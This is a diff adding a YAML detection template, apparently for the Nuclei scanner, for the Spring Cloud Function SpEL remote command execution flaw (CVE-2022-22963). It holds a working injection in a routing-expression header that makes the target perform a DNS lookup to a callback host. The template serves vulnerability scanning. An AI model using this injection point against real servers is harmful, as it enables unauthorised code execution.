@@ -1,0 +1,26 @@
+id: spring-cloud-function-spel-rce
+info:
+  name: Spring Cloud Function SpEL Remote Command Execution (CVE-2022-22963)
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: rce,cve,CVE-2022-22963,spring
+
+http:
+  - raw:
+      - |
+        POST /functionRouter HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: text/plain
+        spring.cloud.function.routing-expression: T(java.net.InetAddress).getByName("{{interactsh-url}}")
+
+        test
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 500
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
